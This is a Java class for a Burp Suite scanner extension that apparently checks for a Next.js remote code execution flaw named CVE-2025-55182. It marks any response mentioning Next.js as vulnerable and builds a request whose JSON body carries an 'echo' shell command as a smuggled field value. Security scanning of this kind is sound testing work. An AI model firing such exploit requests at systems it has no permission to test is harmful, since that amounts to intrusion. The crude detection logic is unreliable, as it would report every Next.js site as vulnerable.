package com.scanner.vuln;

import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;

import java.util.Optional;
import java.util.regex.Pattern;

public class NextJsDetector implements VulnerabilityDetector {

    private static final String VULN_NAME = "CVE-2025-55182 Next.js Remote Code Execution";
    private static final Pattern NEXTJS_PATTERN = Pattern.compile("Next.js|__NEXT", Pattern.CASE_INSENSITIVE);
    private static final String ECHO_PAYLOAD = "echo CVE-2025-55182";

    @Override
    public String vulnerabilityName() {
        return VULN_NAME;
    }

    @Override
    public boolean isVulnerable(HttpRequestResponse requestResponse) {
        if (requestResponse.response() == null) {
            return false;
        }

        String headers = requestResponse.response().headers().stream()
                .map(h -> h.name() + ": " + h.value())
                .reduce("", (a, b) -> a + "\n" + b);
        String body = requestResponse.response().bodyToString();

        return NEXTJS_PATTERN.matcher(headers).find() || NEXTJS_PATTERN.matcher(body).find();
    }

    @Override
    public Optional<HttpRequest> buildExploitRequest(HttpRequest originalRequest) {
        String body = "{\"searchParams\":\"" + ECHO_PAYLOAD + "\",\"nextStatusCode\":200}";
        HttpRequest exploitRequest = originalRequest.withBody(body);
        return Optional.of(exploitRequest);
    }
}
